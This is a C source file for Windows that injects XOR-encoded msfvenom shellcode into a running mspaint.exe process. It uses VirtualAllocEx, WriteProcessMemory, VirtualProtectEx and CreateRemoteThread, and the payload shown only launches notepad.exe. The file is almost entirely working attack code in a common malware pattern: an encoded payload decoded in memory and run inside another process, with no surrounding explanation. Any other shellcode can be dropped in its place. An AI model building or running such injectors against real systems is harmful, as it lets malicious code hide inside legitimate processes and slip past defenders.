#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#define TARGET_PROCESS_NAME L"mspaint.exe"

// msfvenom -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread -f c
// ===[ XOR-Encrypted Shellcode ]===
unsigned char shellcode[] =
"\x56\xe2\x29\x4e\x5a\x42\x6a\xaa\xaa\xaa\xeb\xfb\xeb\xfa\xf8\xfb"
"\xfc\xe2\x9b\x78\xcf\xe2\x21\xf8\xca\xe2\x21\xf8\xb2\xe2\x21\xf8"
"\x8a\xe2\x21\xd8\xfa\xe2\xa5\x1d\xe0\xe0\xe7\x9b\x63\xe2\x9b\x6a"
"\x06\x96\xcb\xd6\xa8\x86\x8a\xeb\x6b\x63\xa7\xeb\xab\x6b\x48\x47"
"\xf8\xeb\xfb\xe2\x21\xf8\x8a\x21\xe8\x96\xe2\xab\x7a\x21\x2a\x22"
"\xaa\xaa\xaa\xe2\x2f\x6a\xde\xcd\xe2\xab\x7a\xfa\x21\xe2\xb2\xee"
"\x21\xea\x8a\xe3\xab\x7a\x49\xfc\xe2\x55\x63\xeb\x21\x9e\x22\xe2"
"\xab\x7c\xe7\x9b\x63\xe2\x9b\x6a\x06\xeb\x6b\x63\xa7\xeb\xab\x6b"
"\x92\x4a\xdf\x5b\xe6\xa9\xe6\x8e\xa2\xef\x93\x7b\xdf\x72\xf2\xee"
"\x21\xea\x8e\xe3\xab\x7a\xcc\xeb\x21\xa6\xe2\xee\x21\xea\xb6\xe3"
"\xab\x7a\xeb\x21\xae\x22\xe2\xab\x7a\xeb\xf2\xeb\xf2\xf4\xf3\xf0"
"\xeb\xf2\xeb\xf3\xeb\xf0\xe2\x29\x46\x8a\xeb\xf8\x55\x4a\xf2\xeb"
"\xf3\xf0\xe2\x21\xb8\x43\xfd\x55\x55\x55\xf7\xe2\x10\xab\xaa\xaa"
"\xaa\xaa\xaa\xaa\xaa\xe2\x27\x27\xab\xab\xaa\xaa\xeb\x10\x9b\x21"
"\xc5\x2d\x55\x7f\x11\x4a\xb7\x80\xa0\xeb\x10\x0c\x3f\x17\x37\x55"
"\x7f\xe2\x29\x6e\x82\x96\xac\xd6\xa0\x2a\x51\x4a\xdf\xaf\x11\xed"
"\xb9\xd8\xc5\xc0\xaa\xf3\xeb\x23\x70\x55\x7f\xc4\xc5\xde\xcf\xda"
"\xcb\xce\x84\xcf\xd2\xcf\xaa";

static const size_t shellcodeSize = sizeof(shellcode) - 1; // exclude null terminator

unsigned char key = 0xAA;

// ---[ XOR Decryption ]---
void xor (unsigned char* data, int length, unsigned char key)
{
    for (int i = 0; i < length; i++)
    {
        data[i] ^= key;
    }
}

// ---[ Process Handle Lookup ]---
BOOL OpenProcessByName(LPCWSTR targetName, DWORD* outPid, HANDLE* outHandle)
{
    if (!targetName || !outPid || !outHandle)
    {
        printf("[ERROR] OpenProcessByName: invalid argument(s)\n");
        return FALSE;
    }

    *outPid = 0;
    *outHandle = NULL;

    HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshotHandle == INVALID_HANDLE_VALUE)
    {
        printf("[ERROR] CreateToolhelp32Snapshot failed (err=%lu)\n", GetLastError());
        return FALSE;
    }

    PROCESSENTRY32W processEntry = { sizeof(processEntry) };

    if (!Process32FirstW(snapshotHandle, &processEntry))
    {
        printf("[ERROR] Process32FirstW failed (err=%lu)\n", GetLastError());
        CloseHandle(snapshotHandle);
        return FALSE;
    }

    do {
        if (_wcsicmp(processEntry.szExeFile, targetName))
            continue;

        *outPid = processEntry.th32ProcessID;
        *outHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *outPid);

        if (!*outHandle)
        {
            printf("[ERROR] OpenProcess PID %lu failed (err=%lu)\n",
                *outPid, GetLastError());
            CloseHandle(snapshotHandle);
            return FALSE;
        }

        printf("[INFO] Opened %ws [PID %lu]\n", targetName, *outPid);
        CloseHandle(snapshotHandle);
        return TRUE;

    } while (Process32NextW(snapshotHandle, &processEntry));

    printf("[WARN] Process \"%ws\" not found\n", targetName);
    CloseHandle(snapshotHandle);
    return FALSE;
}

// ===[ Shellcode Injection ]===
BOOL InjectShellcode(HANDLE hProcess, PBYTE pShellcode, SIZE_T shellcodeSize)
{
    PVOID remoteAddr = VirtualAllocEx(hProcess,
                                        NULL,
                                        shellcodeSize,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_READWRITE);
    if (!remoteAddr)
    {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[+] Allocated memory at: 0x%p\n", remoteAddr);
    printf("[#] Press <Enter> to write payload...");
    getchar();

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, 
                              remoteAddr, 
                              pShellcode, 
                              shellcodeSize, 
                              &bytesWritten))
    {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        return FALSE;
    }
    if (bytesWritten != shellcodeSize)
    {
        printf("[-] Incomplete write: wrote %llu of %llu bytes\n",
            (unsigned long long)bytesWritten, (unsigned long long)shellcodeSize);
        return FALSE;
    }

    // Cleaning the buffer of the shellcode in the local process
    memset(pShellcode, '\0', shellcodeSize);

    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, 
                            remoteAddr, 
                            shellcodeSize, 
                            PAGE_EXECUTE_READ, &oldProtect))
    {
        printf("[-] VirtualProtectEx failed: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[#] Press <Enter> to execute payload...");
    getchar();

    HANDLE hThread = CreateRemoteThread(hProcess, 
                                            NULL, 
                                            0,
                                            (LPTHREAD_START_ROUTINE)remoteAddr, 
                                            NULL, 
                                            0, 
                                            NULL);

    if (!hThread)
    {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
        return FALSE;
    }

    CloseHandle(hThread);
    return TRUE;
}

// ===[ Entry Point ]===
int wmain()
{
    DWORD pid;
    HANDLE hProcess;

    wprintf(L"[i] Using hardcoded target: %s\n", TARGET_PROCESS_NAME);
    if (!OpenProcessByName(TARGET_PROCESS_NAME, &pid, &hProcess))
    {
        printf("[-] Unable to get handle to target process.\n");
        return -1;
    }

    printf("[*] Decrypting shellcode...\n");
    xor (shellcode, shellcodeSize, key);

    printf("[*] Injecting shellcode...\n");
    if (!InjectShellcode(hProcess, shellcode, shellcodeSize))
    {
        printf("[-] Injection failed\n");
        CloseHandle(hProcess);
        return -1;
    }

    printf("[+] Injection complete\n");
    CloseHandle(hProcess);
    return 0;
}
